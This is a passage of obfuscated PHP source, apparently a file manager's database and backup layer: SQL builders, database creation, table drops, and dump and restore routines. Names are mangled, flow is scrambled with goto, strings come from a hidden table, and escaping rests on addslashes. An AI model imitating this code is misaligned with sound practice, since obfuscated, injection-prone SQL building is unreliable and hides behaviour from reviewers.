DÓ­¡Äæ³ª: foreach ($E‚ŸÌóã› as $díÁŞåš¬ => $AÉ‹‹åã×ô) { if (is_array($AÉ‹‹åã×ô) && $dœÑçåøÀ¢[281] == $AÉ‹‹åã×ô[0]) { $fàÜÚ×ï¯‘[] = $this->parseKey($díÁŞåš¬); $aî®è£ó„[] = $AÉ‹‹åã×ô[1]; } elseif (is_scalar($AÉ‹‹åã×ô) || is_null($AÉ‹‹åã×ô)) { $fàÜÚ×ï¯‘[] = $this->parseKey($díÁŞåš¬); $aî®è£ó„[] = $this->parseValue($AÉ‹‹åã×ô); } } $fà¿õïÑÁÈ = ($aØî†øÕ´š ? $dœÑçåøÀ¢[812] : $dœÑçåøÀ¢[813]) . $dœÑçåøÀ¢[814] . $this->parseTable($aÍ¯“ŒÑÒ[$dœÑçåøÀ¢[263]]) . $dœÑçåøÀ¢[808] . implode($dœÑçåøÀ¢[47], $fàÜÚ×ï¯‘) . $dœÑçåøÀ¢[809] . implode($dœÑçåøÀ¢[47], $aî®è£ó„) . $dœÑçåøÀ¢[810]; $fà¿õïÑÁÈ .= $this->parseLock(isset($aÍ¯“ŒÑÒ[$dœÑçåøÀ¢[765]]) ? $aÍ¯“ŒÑÒ[$dœÑçåøÀ¢[765]] : !1); goto Eİ”Â¼ƒ”; Eİ”Â¼ƒ”: $fà¿õïÑÁÈ .= $this->parseComment(!empty($aÍ¯“ŒÑÒ[$dœÑçåøÀ¢[337]]) ? $aÍ¯“ŒÑÒ[$dœÑçåøÀ¢[337]] : $dœÑçåøÀ¢[33]); return $this->execute($fà¿õïÑÁÈ, $this->parseBind(!empty($aÍ¯“ŒÑÒ[$dœÑçåøÀ¢[269]]) ? $aÍ¯“ŒÑÒ[$dœÑçåøÀ¢[269]] : array())); goto Bö›ƒÀø‘ï; fÔá±Éë›¤: $dœÑçåøÀ¢ =& $_SERVER[õëù©û]; $aî®è£ó„ = $fàÜÚ×ï¯‘ = array(); $this->model = $aÍ¯“ŒÑÒ[$dœÑçåøÀ¢[265]]; goto DÓ­¡Äæ³ª; Bö›ƒÀø‘ï: } public function selectInsert($FõáÁÀÁ×, $a¥Í²—ŒÊ, $F‡÷ÇË±­› = array()) { goto EÄİå“‚¢; eÙ±ÛÍ¬Í†: array_walk($FõáÁÀÁ×, array($this, $dó°ª„¦´Â[811])); $FĞ¬ÍõïŸö = $dó°ª„¦´Â[946] . $this->parseTable($a¥Í²—ŒÊ) . $dó°ª„¦´Â[808] . implode($dó°ª„¦´Â[47], $FõáÁÀÁ×) . $dó°ª„¦´Â[925]; $FĞ¬ÍõïŸö .= $this->buildSelectSql($F‡÷ÇË±­›); goto a·Ûíõ¿óÃ; a·Ûíõ¿óÃ: return $this->execute($FĞ¬ÍõïŸö, $this->parseBind(!empty($F‡÷ÇË±­›[$dó°ª„¦´Â[269]]) ? $F‡÷ÇË±­›[$dó°ª„¦´Â[269]] : array())); goto Eë×´Ô®“; EÄİå“‚¢: $dó°ª„¦´Â =& $_SERVER[õëù©û]; $this->model = $F‡÷ÇË±­›[$dó°ª„¦´Â[265]]; if (is_string($FõáÁÀÁ×)) { $FõáÁÀÁ× = explode($dó°ª„¦´Â[47], $FõáÁÀÁ×); } goto eÙ±ÛÍ¬Í†; Eë×´Ô®“: } public function update($a³à×½œ¶…, $fŸœœÜì×Å) { $Eƒ¤Ô‡–Úí =& $_SERVER[õëù©û]; $this->model = $fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[265]]; $F¡§‘‰öƒ = $Eƒ¤Ô‡–Úí[947] . $this->parseTable($fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[263]]) . $this->parseSet($a³à×½œ¶…) . $this->parseWhere(!empty($fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[259]]) ? $fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[259]] : $Eƒ¤Ô‡–Úí[33]) . $this->parseOrder(!empty($fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[346]]) ? $fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[346]] : $Eƒ¤Ô‡–Úí[33]) . $this->parseLimit(!empty($fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[276]]) ? $fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[276]] : $Eƒ¤Ô‡–Úí[33]) . $this->parseLock(isset($fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[765]]) ? $fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[765]] : !1) . $this->parseComment(!empty($fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[337]]) ? $fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[337]] : $Eƒ¤Ô‡–Úí[33]); return $this->execute($F¡§‘‰öƒ, $this->parseBind(!empty($fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[269]]) ? $fŸœœÜì×Å[$Eƒ¤Ô‡–Úí[269]] : array())); } public function delete($Cô¼Á¤ î¨ = array()) { $Aôñ¯ë¹Ê =& $_SERVER[õëù©û]; $this->model = $Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[265]]; $BÜœ·ĞùÕì = $Aôñ¯ë¹Ê[948] . $this->parseTable($Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[263]]) . $this->parseWhere(!empty($Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[259]]) ? $Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[259]] : $Aôñ¯ë¹Ê[33]) . $this->parseOrder(!empty($Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[346]]) ? $Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[346]] : $Aôñ¯ë¹Ê[33]) . $this->parseLimit(!empty($Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[276]]) ? $Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[276]] : $Aôñ¯ë¹Ê[33]) . $this->parseLock(isset($Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[765]]) ? $Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[765]] : !1) . $this->parseComment(!empty($Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[337]]) ? $Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[337]] : $Aôñ¯ë¹Ê[33]); return $this->execute($BÜœ·ĞùÕì, $this->parseBind(!empty($Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[269]]) ? $Cô¼Á¤ î¨[$Aôñ¯ë¹Ê[269]] : array())); } public function select($dœ«÷ÚÑ½ = array()) { goto DÎ„Å±Ùœœ; Eø§Í­—±ë: $AÌ©ó·‡ = isset($dœ«÷ÚÑ½[$dŠºÂñÍƒ[333]]) ? $dœ«÷ÚÑ½[$dŠºÂñÍƒ[333]] : !1; if ($AÌ©ó·‡) { $e‹±øõôœ = is_string($AÌ©ó·‡[$dŠºÂñÍƒ[89]]) ? $AÌ©ó·‡[$dŠºÂñÍƒ[89]] : $dŠºÂñÍƒ[949] . md5($aØºõÊ›Ğ²); $bªİ¹Ô¨‡ = think_cache($e‹±øõôœ, $dŠºÂñÍƒ[33], $AÌ©ó·‡); if (!1 !== $bªİ¹Ô¨‡) { return $bªİ¹Ô¨‡; } } $F¶»«åñ¼  = $this->query($aØºõÊ›Ğ², $this->parseBind(!empty($dœ«÷ÚÑ½[$dŠºÂñÍƒ[269]]) ? $dœ«÷ÚÑ½[$dŠºÂñÍƒ[269]] : array())); goto dÆÍêÒ„ˆ‘; DÎ„Å±Ùœœ: $dŠºÂñÍƒ =& $_SERVER[õëù©û]; $this->model = $dœ«÷ÚÑ½[$dŠºÂñÍƒ[265]]; $aØºõÊ›Ğ² = $this->buildSelectSql($dœ«÷ÚÑ½); goto Eø§Í­—±ë; dÆÍêÒ„ˆ‘: if ($AÌ©ó·‡ && !1 !== $F¶»«åñ¼ ) { think_cache($e‹±øõôœ, $F¶»«åñ¼ , $AÌ©ó·‡); } return $F¶»«åñ¼ ; goto fÚ´“šùÏ¡; fÚ´“šùÏ¡: } public function buildSelectSql($aÇëÀÊ—ö = array()) { goto DÙâÅÎ»àÕ; DÙâÅÎ»àÕ: $BĞÊ÷¯¢†› =& $_SERVER[õëù©û]; if (isset($aÇëÀÊ—ö[$BĞÊ÷¯¢†›[336]])) { if (strpos($aÇëÀÊ—ö[$BĞÊ÷¯¢†›[336]], $BĞÊ÷¯¢†›[47])) { list($Dê—áºµÉÅ, $c‰±¶ŒÎ‹Œ) = explode($BĞÊ÷¯¢†›[47], $aÇëÀÊ—ö[$BĞÊ÷¯¢†›[336]]); } else { $Dê—áºµÉÅ = $aÇëÀÊ—ö[$BĞÊ÷¯¢†›[336]]; } $Dê—áºµÉÅ = $Dê—áºµÉÅ ? $Dê—áºµÉÅ : 1; $c‰±¶ŒÎ‹Œ = isset($c‰±¶ŒÎ‹Œ) ? $c‰±¶ŒÎ‹Œ : (is_numeric($aÇëÀÊ—ö[$BĞÊ÷¯¢†›[276]]) ? $aÇëÀÊ—ö[$BĞÊ÷¯¢†›[276]] : 20); $B‘ä³‰‡˜¹ = $c‰±¶ŒÎ‹Œ * ((int) $Dê—áºµÉÅ - 1); $aÇëÀÊ—ö[$BĞÊ÷¯¢†›[276]] = $B‘ä³‰‡˜¹ . $BĞÊ÷¯¢†›[47] . $c‰±¶ŒÎ‹Œ; } if (think_config($BĞÊ÷¯¢†›[950])) { $CÉĞÒ’³·æ = $BĞÊ÷¯¢†›[951] . md5(serialize($aÇëÀÊ—ö)); $DäƒÁëÛ˜ = think_cache($CÉĞÒ’³·æ); if ($DäƒÁëÛ˜) { return $DäƒÁëÛ˜; } } goto bâÉ±¤Æ¹Ö; bâÉ±¤Æ¹Ö: $BŸÆŞç¹ì¯ = $this->parseSql($this->selectSql, $aÇëÀÊ—ö); $BŸÆŞç¹ì¯ .= $this->parseLock(isset($aÇëÀÊ—ö[$BĞÊ÷¯¢†›[765]]) ? $aÇëÀÊ—ö[$BĞÊ÷¯¢†›[765]] : !1); if (isset($CÉĞÒ’³·æ)) { think_cache($CÉĞÒ’³·æ, $BŸÆŞç¹ì¯); } goto DÖöÉ°êÇÁ; DÖöÉ°êÇÁ: return $BŸÆŞç¹ì¯; goto DìéŠ§ì©; DìéŠ§ì©: } public function parseSql($BÙôÔÕ¢´, $A¥Ò†µ†è = array()) { $f‹æ‹¤ƒ¶ˆ =& $_SERVER[õëù©û]; $BÙôÔÕ¢´ = str_replace(array($f‹æ‹¤ƒ¶ˆ[952], $f‹æ‹¤ƒ¶ˆ[953], $f‹æ‹¤ƒ¶ˆ[954], $f‹æ‹¤ƒ¶ˆ[955], $f‹æ‹¤ƒ¶ˆ[956], $f‹æ‹¤ƒ¶ˆ[957], $f‹æ‹¤ƒ¶ˆ[958], $f‹æ‹¤ƒ¶ˆ[959], $f‹æ‹¤ƒ¶ˆ[960], $f‹æ‹¤ƒ¶ˆ[961], $f‹æ‹¤ƒ¶ˆ[962]), array($this->parseTable("{$A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[263]]}"), $this->parseDistinct(isset($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[963]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[963]] : !1), $this->parseField(!empty($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[257]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[257]] : $f‹æ‹¤ƒ¶ˆ[172]), $this->parseJoin(!empty($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[266]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[266]] : $f‹æ‹¤ƒ¶ˆ[33]), $this->parseWhere(!empty($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[259]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[259]] : $f‹æ‹¤ƒ¶ˆ[33]), $this->parseGroup(!empty($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[964]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[964]] : $f‹æ‹¤ƒ¶ˆ[33]), $this->parseHaving(!empty($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[965]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[965]] : $f‹æ‹¤ƒ¶ˆ[33]), $this->parseOrder(!empty($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[346]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[346]] : $f‹æ‹¤ƒ¶ˆ[33]), $this->parseLimit(!empty($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[276]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[276]] : $f‹æ‹¤ƒ¶ˆ[33]), $this->parseUnion(!empty($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[331]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[331]] : $f‹æ‹¤ƒ¶ˆ[33]), $this->parseComment(!empty($A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[337]]) ? $A¥Ò†µ†è[$f‹æ‹¤ƒ¶ˆ[337]] : $f‹æ‹¤ƒ¶ˆ[33])), $BÙôÔÕ¢´); return $BÙôÔÕ¢´; } public function getLastSql($d‡Û‰í”¨Ë = '') { return $d‡Û‰í”¨Ë ? $this->modelSql[$d‡Û‰í”¨Ë] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($cù·‚“½Ú) { return addslashes($cù·‚“½Ú); } public function setModel($f¸”‰…ÛÌ) { $this->model = $f¸”‰…ÛÌ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($DéªŠé²Â×, $BšùÛíˆİ‹ = '') { $this->database = $DéªŠé²Â×; $this->type = $BšùÛíˆİ‹; } public function model($aøì†ºì­µ = '') { return new ModelBase($aøì†ºì­µ, $_SERVER[õëù©û][33], $this->database); } public function db($b¯ˆ…ëªƒ’ = false) { goto Fè›êÜ·èæ; c½Ë‚ÕÅİ: $E‹ÜğÙ¡İÄ = $Cã×ÎÂº‹Ú[$AØ»¼Íá”[230]]; $Cã×ÎÂº‹Ú[$AØ»¼Íá”[230]] = $AØ»¼Íá”[33]; if ($Cã×ÎÂº‹Ú[$AØ»¼Íá”[881]] == $AØ»¼Íá”[719]) { $dÕ¼—è´÷Ô = $Cã×ÎÂº‹Ú[$AØ»¼Íá”[880]]; $Cã×ÎÂº‹Ú[$AØ»¼Íá”[880]] = substr($dÕ¼—è´÷Ô, 0, strrpos($dÕ¼—è´÷Ô, $AØ»¼Íá”[966])); } goto C‰­ÕÌŞğğ; e §Ñì©Œ¨: $this->database = $Cã×ÎÂº‹Ú; $e¯ë·¥Ò§->execute("\x75\x73\x65\x20\140{$E‹ÜğÙ¡İÄ}\140"); return $e¯ë·¥Ò§; goto BÓ¦¸¯ˆª¬; Fè›êÜ·èæ: $AØ»¼Íá” =& $_SERVER[õëù©û]; $Cã×ÎÂº‹Ú = $this->database; if ($this->type == $AØ»¼Íá”[9] || !$b¯ˆ…ëªƒ’) { return $this->model()->db(); } goto c½Ë‚ÕÅİ; CæùĞ²¶×‘: if (!$AíÚÉŞğ‘š) { $e¯ë·¥Ò§->execute("\x63\x72\x65\x61\164\145\x20\144\x61\x74\141\142\141\163\145\x20\x60{$E‹ÜğÙ¡İÄ}\x60"); } $Cã×ÎÂº‹Ú[$AØ»¼Íá”[230]] = $E‹ÜğÙ¡İÄ; if ($Cã×ÎÂº‹Ú[$AØ»¼Íá”[881]] == $AØ»¼Íá”[719]) { $Cã×ÎÂº‹Ú[$AØ»¼Íá”[880]] .= $AØ»¼Íá”[966] . $E‹ÜğÙ¡İÄ; } goto e §Ñì©Œ¨; C‰­ÕÌŞğğ: $this->database = $Cã×ÎÂº‹Ú; $e¯ë·¥Ò§ = $this->model()->db(); $AíÚÉŞğ‘š = $e¯ë·¥Ò§->execute("\x73\x68\157\x77\40\x64\141\x74\141\142\x61\x73\x65\x73\x20\154\151\153\x65\40\x27{$E‹ÜğÙ¡İÄ}\47"); goto CæùĞ²¶×‘; BÓ¦¸¯ˆª¬: } public function createTable($D“Ø„ÎŞ…˜, $c––ÅåÂ¶ = null) { $dáÚ•ÑƒéË =& $_SERVER[õëù©û]; if (!IO::exist($D“Ø„ÎŞ…˜)) { show_json(LNG($dáÚ•ÑƒéË[967]), !1); } $bÏ…³É¤µ = sqlSplit(IO::getContent($D“Ø„ÎŞ…˜)); foreach ($bÏ…³É¤µ as $d´¾’¶îù–) { if ($c––ÅåÂ¶) { $EÇÏçõ›…¨ = stripos($d´¾’¶îù–, $dáÚ•ÑƒéË[968]) === 0; if ($EÇÏçõ›…¨) { $c––ÅåÂ¶->task[$dáÚ•ÑƒéË[969]] += 1; } } $this->model()->db()->execute($d´¾’¶îù–); if ($c––ÅåÂ¶ && $EÇÏçõ›…¨) { $DŒÉº¯— = $dáÚ•ÑƒéË[970]; preg_match($DŒÉº¯—, $d´¾’¶îù–, $bÔ°‘•ì„À); $c––ÅåÂ¶->task[$dáÚ•ÑƒéË[971]] = trim($fÏŞÇ‡™æõ[0], $dáÚ•ÑƒéË[817]); $c––ÅåÂ¶->update(1); } } $this->taskToCache($c––ÅåÂ¶); } public function insertTable($f¯œŒÊ†ªˆ, $e—½Ï¹ŠîŠ = null) { $EÕÏ—îò· =& $_SERVER[õëù©û]; foreach ($f¯œŒÊ†ªˆ as $C¢ºƒ¼¯Ø) { $bŒ×„ÁƒÙè = basename($C¢ºƒ¼¯Ø); $bŒ×„ÁƒÙè = substr($bŒ×„ÁƒÙè, 0, strrpos($bŒ×„ÁƒÙè, $EÕÏ—îò·[91])); if ($e—½Ï¹ŠîŠ) { $e—½Ï¹ŠîŠ->task[$EÕÏ—îò·[971]] = $bŒ×„ÁƒÙè; } if (get_filesize($C¢ºƒ¼¯Ø) == 0) { continue; } $bò°³Õá¢ƒ = $this->sqlToDb($C¢ºƒ¼¯Ø, $e—½Ï¹ŠîŠ); if (!$bò°³Õá¢ƒ) { show_json(LNG($EÕÏ—îò·[972]) . "\133{$bŒ×„ÁƒÙè}\x5d", !1); } } $this->taskToCache($e—½Ï¹ŠîŠ); } public function sqlFromDb($e¡¿ø¢–¿, $f½•Ìë¡ƒ‘, $bÔÔâÁ¡˜ = null, $c¥ÓéÇê· = null) { goto a°–÷®‰¥á; a°–÷®‰¥á: if ($bÔÔâÁ¡˜) { $bÔÔâÁ¡˜->task[$_SERVER[õëù©û][971]] = $e¡¿ø¢–¿; } $fŒğÙ¼‡ÒĞ = $this->model($e¡¿ø¢–¿); $fŒÊÀåŠ¬ì = 0; goto AŠÏå»…°é; FØ†›«Â£Ç: fclose($FÀãñô§ò); return $fŒÊÀåŠ¬ì; goto c˜©±¬„ò÷; dĞ†ñ™Â‹ë: $fãÏ±ƒŒ¹ = $fŒğÙ¼‡ÒĞ->getPk(); $C˜¬¿Ä˜Î = $fŒğÙ¼‡ÒĞ->getDbFields(); do { $CÔÆÂ˜±Ó = $fŒğÙ¼‡ÒĞ->field($C˜¬¿Ä˜Î)->order($fãÏ±ƒŒ¹ . $_SERVER[õëù©û][974])->selectPage($C†ß‚”Óô¥, $aÜèØÌİá); $C„Àñœ£ùƒ = !empty($CÔÆÂ˜±Ó[$_SERVER[õëù©û][350]]) ? $CÔÆÂ˜±Ó[$_SERVER[õëù©û][350]] : array(); if (!($DÂï¯î³ÇŸ = count($C„Àñœ£ùƒ))) { break; } if ($bÔÔâÁ¡˜) { $bÔÔâÁ¡˜->task[$_SERVER[õëù©û][969]] += $DÂï¯î³ÇŸ; } $b¤¡·™®šË = array(); foreach ($C„Àñœ£ùƒ as $B¯²‚ ÑÒÑ) { if ($c¥ÓéÇê·) { $B¯²‚ ÑÒÑ[$_SERVER[õëù©û][75]] = "\x7b\151\157\72{$c¥ÓéÇê·}\175" . substr($B¯²‚ ÑÒÑ[$_SERVER[õëù©û][75]], strlen("\173\151\x6f\x3a{$B¯²‚ ÑÒÑ[$_SERVER[õëù©û][738]]}\x7d")); $B¯²‚ ÑÒÑ[$_SERVER[õëù©û][738]] = $c¥ÓéÇê·; } $b¤¡·™®šË[] = $_SERVER[õëù©û][975] . $this->sqlEncode($B¯²‚ ÑÒÑ) . $_SERVER[õëù©û][976]; } $A¤ÊĞï¾ = "\111\x4e\x53\x45\122\x54\40\111\116\124\x4f\x20\140{$e¡¿ø¢–¿}\x60\x20\x28\x60" . implode($_SERVER[õëù©û][977], $C˜¬¿Ä˜Î) . $_SERVER[õëù©û][978]; fwrite($FÀãñô§ò, $A¤ÊĞï¾ . implode($_SERVER[õëù©û][979], $b¤¡·™®šË) . $_SERVER[õëù©û][67] . PHP_EOL); $aÜèØÌİá++; $fŒÊÀåŠ¬ì += $DÂï¯î³ÇŸ; if ($bÔÔâÁ¡˜) { $bÔÔâÁ¡˜->update($DÂï¯î³ÇŸ); } } while ($DÂï¯î³ÇŸ == $C†ß‚”Óô¥); goto FØ†›«Â£Ç; AŠÏå»…°é: $aÜèØÌİá = 1; $C†ß‚”Óô¥ = 500; $FÀãñô§ò = fopen($f½•Ìë¡ƒ‘, $_SERVER[õëù©û][973]); goto dĞ†ñ™Â‹ë; c˜©±¬„ò÷: } public function sqlToDb($Fä”±™–×ö, $C–øåùÊèÊ = null) { goto FÁ¼İê¸ ã; aáÚ¿¯Ï¢å: if (!$c÷Ì‰¬¼£¢) { return !1; } $E“„°Í¦•« = 0; $b¶Û°†¶® = $b¿˜›à½[33]; goto eãÙ¯¤ù»´; FÁ¼İê¸ ã: $b¿˜›à½ =& $_SERVER[õëù©û]; $F¼ÂµÓ“¿¨ = $this->model()->db(); $c÷Ì‰¬¼£¢ = @fopen($Fä”±™–×ö, $b¿˜›à½[980]); goto aáÚ¿¯Ï¢å; eãÙ¯¤ù»´: $EÃöÅ¿ˆ = 500 + 1; while (!feof($c÷Ì‰¬¼£¢)) { if ($C–øåùÊèÊ && $E“„°Í¦•« != 0) { $C–øåùÊèÊ->task[$b¿˜›à½[969]] += 1; } $E“„°Í¦•«++; $c…ß‘ÌÀö¶ = trim(fgets($c÷Ì‰¬¼£¢)); $b¶Û°†¶® .= $b¿˜›à½[50] . $this->sqlDecode($c…ß‘ÌÀö¶, $this->type); if ($E“„°Í¦•« == $EÃöÅ¿ˆ) { $b¶Û°†¶® = rtrim(trim($b¶Û°†¶®), $b¿˜›à½[67]); if (!$F¼ÂµÓ“¿¨->execute($b¶Û°†¶®)) { return !1; } if ($C–øåùÊèÊ) { $C–øåùÊèÊ->update($E“„°Í¦•« - 1); } $b¶Û°†¶® = $b¿˜›à½[33]; $E“„°Í¦•« = 0; } } fclose($c÷Ì‰¬¼£¢); goto bÆ˜ä·Áìó; bÆ˜ä·Áìó: if ($b¶Û°†¶®) { $b¶Û°†¶® = rtrim(trim($b¶Û°†¶®), $b¿˜›à½[67]); if (!$F¼ÂµÓ“¿¨->execute($b¶Û°†¶®)) { return !1; } if ($C–øåùÊèÊ) { $C–øåùÊèÊ->update($E“„°Í¦•« - 1); } } return !0; goto c—ÊğËÈ‹; c—ÊğËÈ‹: } public function dropTable($B‹©œ¯‘“ = null) { $b‰²¾”‹ˆô = $this->model()->db(); $Aïé¾Ú§Ø = $B‹©œ¯‘“ ? array($B‹©œ¯‘“) : $b‰²¾”‹ˆô->getTables(); if (!$Aïé¾Ú§Ø) { return; } foreach ($Aïé¾Ú§Ø as $B‹©œ¯‘“) { $b‰²¾”‹ˆô->execute("\x64\x72\157\x70\x20\x74\x61\x62\x6c\x65\x20\x69\x66\40\x65\170\x69\163\164\x73\40\140{$B‹©œ¯‘“}\140"); } } private function taskToCache($c‘´±§¶Ã = null) { $C°ˆ‘·õ =& $_SERVER[õëù©û]; if (!$c‘´±§¶Ã) { return; } $b‹ö Ôâ—“ = array($C°ˆ‘·õ[971] => $c‘´±§¶Ã->task[$C°ˆ‘·õ[971]], $C°ˆ‘·õ[969] => $c‘´±§¶Ã->task[$C°ˆ‘·õ[969]], $C°ˆ‘·õ[981] => $c‘´±§¶Ã->task[$C°ˆ‘·õ[981]]); if ($b‹ö Ôâ—“[$C°ˆ‘·õ[969]] == $b‹ö Ôâ—“[$C°ˆ‘·õ[981]]) { $b‹ö Ôâ—“[$C°ˆ‘·õ[691]] = 1; } Cache::set($C°ˆ‘·õ[982] . $c‘´±§¶Ã->task[$C°ˆ‘·õ[363]], $b‹ö Ôâ—“); $c‘´±§¶Ã->end(); } private function sqlEncode($FóÂäëø×Á) { $a—ôØ³ =& $_SERVER[õëù©û]; $dÉ ±Ó¸° = array(); foreach ($FóÂäëø×Á as $a‰“ß¡¿) { if (is_array($a‰“ß¡¿)) { $a‰“ß¡¿ = json_encode_force($a‰“ß¡¿); } $a‰“ß¡¿ = addslashes($a‰“ß¡¿); $a‰“ß¡¿ = str_replace(array($a—ôØ³[983], $a—ôØ³[213]), array($a—ôØ³[984], $a—ôØ³[985]), $a‰“ß¡¿); $dÉ ±Ó¸°[] = str_replace($a—ôØ³[55], $a—ôØ³[986], $a‰“ß¡¿); } return $a—ôØ³[55] . implode($a—ôØ³[987], $dÉ ±Ó¸°) . $a—ôØ³[55]; } private function sqlDecode($b†–©åğßÃ, $dö‹î¸–İñ) { $c¸Ôæ³›Ë« =& $_SERVER[õëù©û]; $b†–©åğßÃ = str_replace(array($c¸Ôæ³›Ë«[984], $c¸Ôæ³›Ë«[985]), array($c¸Ôæ³›Ë«[983], $c¸Ôæ³›Ë«[213]), $b†–©åğßÃ); if ($dö‹î¸–İñ == $c¸Ôæ³›Ë«[9]) { $b†–©åğßÃ = stripslashes($b†–©åğßÃ); } return $b†–©åğßÃ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($c¸ñğğ»±Ğ, $b™ÑõÎ»õ) { $bÌ×Í¸ä¤„ = self::driverMake($b™ÑõÎ»õ[0]); if (method_exists($bÌ×Í¸ä¤„, $c¸ñğğ»±Ğ)) { return @call_user_func_array(array($bÌ×Í¸ä¤„, $c¸ñğğ»±Ğ), $b™ÑõÎ»õ); } if (method_exists($bÌ×Í¸ä¤„, $_SERVER[õëù©û][988])) { return @call_user_func_array(array($bÌ×Í¸ä¤„, $c¸ñğğ»±Ğ), $b™ÑõÎ»õ); } else { if (method_exists(self, $c¸ñğğ»±Ğ)) { return @call_user_func_array(array(self, $c¸ñğğ»±Ğ), $b™ÑõÎ»õ); } else { call_user_func_array(array(parent, $c¸ñğğ»±Ğ), $b™ÑõÎ»õ); } } } public static function init($d¨ÉÈƒÄÆ†) { return self::driverMake($d¨ÉÈƒÄÆ†); } public static function copy($DˆÂ¿ñ…å, $cŠ¿š²Óª¹, $fà‚àÍ§äß = false, $D²õŒ¦àâø = false) { return self::copyMove($DˆÂ¿ñ…å, $cŠ¿š²Óª¹, $fà‚àÍ§äß, $_SERVER[õëù©û][485], $D²õŒ¦àâø); } public static function move($AÅ”İí‡À¤, $eä¢×·¬§É, $c²ïò…Åˆä = false, $a®ÃÎ”Æ‚¡ = false) { return self::copyMove($AÅ”İí‡À¤, $eä¢×·¬§É, $c²ïò…Åˆä, $_SERVER[õëù©û][487], $a®ÃÎ”Æ‚¡); } public static function saveFile($AÇöØÆÜ‡°, $cÙÍĞ‡¹, $aƒÄÃéêš = true) { goto c‹š¡‰°¹­; c‹š¡‰°¹­: $b×·Ø‚¥Ã¹ =& $_SERVER[õëù©û]; $bÅóˆ±–÷İ = self::info($cÙÍĞ‡¹); $D·àĞ­È„‰ = self::driverMake($AÇöØÆÜ‡°); goto FõÏâœ»—º; FõÏâœ»—º: $c­í®¯“Ô¢ = self::driverMake($cÙÍĞ‡¹); $d†ÓÍ«ò”— = !1; if ($c­í®¯“Ô¢->pathParse[$b×·Ø‚¥Ã¹[989]]) { $F„õîä = $c­í®¯“Ô¢->pathParse[$b×·Ø‚¥Ã¹[989]]; $d†ÓÍ«ò”— = $c­í®¯“Ô¢; $c­í®¯“Ô¢ = self::driverMake($F„õîä); } goto AË”Ü¦Õ¿¨; CÛ”Ôâ¤ª¨: $D¹ äÇöÎè = self::copyFile($D·àĞ­È„‰, $AÇöØÆÜ‡°, $c­í®¯“Ô¢, $c ¿»ã¹©, $bÅóˆ±–÷İ[$b×·Ø‚¥Ã¹[28]], $FÃŠ´ÍÇó”); if ($d†ÓÍ«ò”—) { $D¹ äÇöÎè = $d†ÓÍ«ò”—->getPathOuter($D¹ äÇöÎè); } return $D¹ äÇöÎè; goto e˜¬ñÓŒïÛ; AË”Ü¦Õ¿¨: $c ¿»ã¹© = $c­í®¯“Ô¢->pathFather($cÙÍĞ‡¹); $FÃŠ´ÍÇó” = !0; if (!$aƒÄÃéêš && self::driverIsSame($D·àĞ­È„‰, $c­í®¯“Ô¢)) { $FÃŠ´ÍÇó” = !1; } goto CÛ”Ôâ¤ª¨; e˜¬ñÓŒïÛ: } private static function copyMove($b”Â´¨ğñ, $cÄª¸ß‹Ä†, $eÚ°ç›ÛÙ‹, $cÛ÷†µ“èÈ, $d¡İ÷ğÂŸÄ = false) { goto dÉ‡ÄÚ‹•”; dÉ‡ÄÚ‹•”: $eŞŸ®ˆŞ” =& $_SERVER[õëù©û]; if (!$b”Â´¨ğñ || $b”Â´¨ğñ == $eŞŸ®ˆŞ”[8] || !$cÄª¸ß‹Ä†) { return !1; } ignore_timeout(); goto BšãéÂ„¢Ë; BÓ‹Á÷Š£Ø: Hook::trigger($eŞŸ®ˆŞ”[72], $E Éù¹†ˆ, $b”Â´¨ğñ, $C•ª’Š­Šà, $cÄª¸ß‹Ä†); $C”±ÎÜà = self::driverIsSame($E 